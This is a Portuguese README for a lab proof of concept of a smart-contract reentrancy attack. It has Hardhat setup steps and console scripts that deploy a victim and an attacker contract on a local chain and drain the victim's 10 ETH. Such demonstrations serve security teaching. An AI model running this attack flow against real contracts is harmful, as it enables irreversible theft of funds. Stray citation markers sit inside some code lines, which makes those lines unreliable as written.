# Prova de Conceito (PoC): Ataque de Reentrancy em Smart Contract

[cite_start]Este repositório contém o código-fonte e a explicação para uma Prova de Conceito (PoC) da vulnerabilidade de **Reentrancy** em Smart Contracts, com base na apresentação "Pentest em Blockchain: Reentrancy"[cite: 1].

---

## ⚠️ AVISO LEGAL DE USO

**Este projeto é estritamente para fins educacionais e de pesquisa em cibersegurança.**

Não me responsabilizo pelo mau uso de qualquer informação aqui contida. O uso de ferramentas para atacar alvos sem autorização prévia é ilegal. **Use apenas em ambientes de laboratório controlados.**

---

## 1. Sobre a Vulnerabilidade: Reentrancy

### O que é?
[cite_start]A Reentrancy (ou Reentrância) é uma das vulnerabilidades mais conhecidas e devastadoras em Smart Contracts[cite: 76].

[cite_start]Ela ocorre quando um contrato externo (Atacante) consegue chamar repetidamente uma função em um contrato (Vítima) *antes* que a primeira invocação dessa função tenha seu estado atualizado[cite: 77].

Em termos simples, o contrato do atacante "re-entra" na função de saque (`withdraw`) várias vezes antes que o contrato da vítima possa atualizar o saldo do atacante para zero.

### Por que é Crítico?
A exploração bem-sucedida dessa falha geralmente permite que um atacante **drene completamente os fundos** (ETH ou outros tokens) de um contrato vulnerável.

* [cite_start]Ataques em blockchain são **irreversíveis**[cite: 28].
* [cite_start]Perdas financeiras podem chegar a centenas de milhões de dólares, como visto em ataques históricos[cite: 7, 8].

---

## 2. Setup do Laboratório (Ambiente Hardhat)

Para recriar o cenário de ataque, usamos o [Hardhat](https://hardhat.org/), um ambiente de desenvolvimento e testes para Ethereum.

### Pré-requisitos
* [Node.js](https://nodejs.org/en) (versão 18 ou superior)
* Dois contratos (Solidity):
    1.  `ReentrancyVictim.sol` (O contrato vulnerável)
    2.  `ReentrancyAttack.sol` (O contrato do atacante)

### Passos para Configuração

1.  **Clone este repositório (ou crie um novo projeto):**
    ```bash
    git clone [SEU_REPO_URL]
    cd [NOME_DA_PASTA]
    ```

2.  **Inicie um projeto Hardhat e instale as dependências:**
    ```bash
    npm init -y
    npm install --save-dev hardhat @nomicfoundation/hardhat-toolbox @nomiclabs/hardhat-ethers ethers
    ```
    *Selecione "Create a JavaScript project" quando o `npx hardhat` perguntar.*

3.  **Adicione os contratos:** Coloque os arquivos `ReentrancyVictim.sol` e `ReentrancyAttack.sol` na pasta `/contracts` do seu projeto.

4.  **Inicie um nó local do Hardhat:**
    [cite_start]Este comando inicia uma blockchain local para testes, já com várias contas pré-carregadas com 10000 ETH de teste [cite: 98, 102-117].
    ```bash
    npx hardhat node
    ```

5.  **Abra o console do Hardhat:**
    Em **outro terminal**, conecte-se ao seu nó local:
    ```bash
    npx hardhat console --network localhost
    ```

Você está pronto para executar o exploit.

---

## 3. Executando o Exploit

O ataque é dividido em duas fases. **Copie e cole** os blocos de código abaixo diretamente no seu console do Hardhat (que você abriu no passo 5).

### Fase 1: Deploy do Contrato Vítima e Depósito Inicial

Primeiro, publicamos o contrato da vítima e depositamos 10 ETH nele, simulando um "banco" com fundos.

```javascript
/* === FASE 1: DEPLOY DA VÍTIMA === */
console.log("Iniciando Fase 1: Deploy do contrato Vítima...");

// Pega as contas de teste. 'deployer' é a vítima, 'attackerEOA' é o atacante
const [deployer, attackerEOA] = await ethers.getSigners();

// Prepara o contrato da Vítima
const Victim = await ethers.getContractFactory("ReentrancyVictim");
const victim = await Victim.deploy();
await victim.waitForDeployment();
const victimAddr = victim.target || victim.address;

console.log("Contrato Vítima ('Victim') publicado em:", victimAddr);

// A Vítima (deployer) deposita 10 ETH no contrato
const txDep = await victim.connect(deployer).deposit({ value: ethers.parseEther("10") });
await txDep.wait();

console.log("Depósito de 10 ETH realizado. Hash:", txDep.hash);

// Verifica o saldo do contrato da Vítima
const victimBalance = ethers.formatEther(await ethers.provider.getBalance(victimAddr));
console.log("SALDO VÍTIMA (Antes do Ataque):", victimBalance, "ETH");
[cite_start]// Resultado esperado: 10.0 ETH [cite: 198]
```

### Fase 2: Deploy do Contrato Atacante e Exploração

Agora, publicamos o contrato do atacante e iniciamos o ataque de reentrância.

```javascript
/* === FASE 2: DEPLOY DO ATACANTE E EXPLORAÇÃO === */
console.log("\nIniciando Fase 2: Deploy do contrato Atacante...");

// Prepara o contrato do Atacante, fornecendo o endereço da Vítima
const Att = await ethers.getContractFactory("ReentrancyAttack");
const attacker = await Att.connect(attackerEOA).deploy(victimAddr);
await attacker.waitForDeployment();
const attackerAddr = attacker.target || attacker.address;

console.log("Contrato Atacante ('Attacker') publicado em:", attackerAddr);

// Verifica saldos ANTES do ataque
console.log("SALDO ATACANTE (Contrato) (Antes do Ataque):", ethers.formatEther(await ethers.provider.getBalance(attackerAddr)));
[cite_start]// Resultado esperado: 0.0 ETH [cite: 236]

console.log("\n>>> EXECUTANDO ATAQUE DE REENTRANCY...");

// Atacante inicia o ataque enviando 1 ETH para a função 'attack'
const attackTx = await attacker.connect(attackerEOA).attack({ value: ethers.parseEther("1") });
const receipt = await attackTx.wait();

console.log("Ataque concluído. Hash:", attackTx.hash);
[cite_start]console.log("Status da Tx:", receipt.status, "| Gas Usado:", receipt.gasUsed.toString()); [cite: 241]

/* === RESULTADOS FINAIS === */
console.log("\n--- RESULTADOS PÓS-ATAQUE ---");

const finalVictimBalance = ethers.formatEther(await ethers.provider.getBalance(victimAddr));
const finalAttackerContractBalance = ethers.formatEther(await ethers.provider.getBalance(attackerAddr));
const finalAttackerEOABalance = ethers.formatEther(await ethers.provider.getBalance(attackerEOA.address));

console.log("SALDO VÍTIMA (Depois do Ataque):", finalVictimBalance, "ETH");
[cite_start]// Resultado esperado: 0.0 ETH [cite: 244]

console.log("SALDO ATACANTE (Contrato) (Depois do Ataque):", finalAttackerContractBalance, "ETH");
[cite_start]// Resultado esperado: 11.0 ETH (10 ETH da Vítima + 1 ETH do Atacante) [cite: 245]

console.log("SALDO ATACANTE (Carteira Pessoal):", finalAttackerEOABalance, "ETH");
[cite_start]// Resultado esperado: (Um pouco menos de 9999 ETH, devido ao gas) [cite: 248]
```

## 4. Conclusão

Se os logs de "Resultados Finais" baterem com o esperado (Vítima com 0.0 ETH e Contrato Atacante com 11.0 ETH), o ataque de Reentrancy foi executado com sucesso, e os fundos foram drenados.
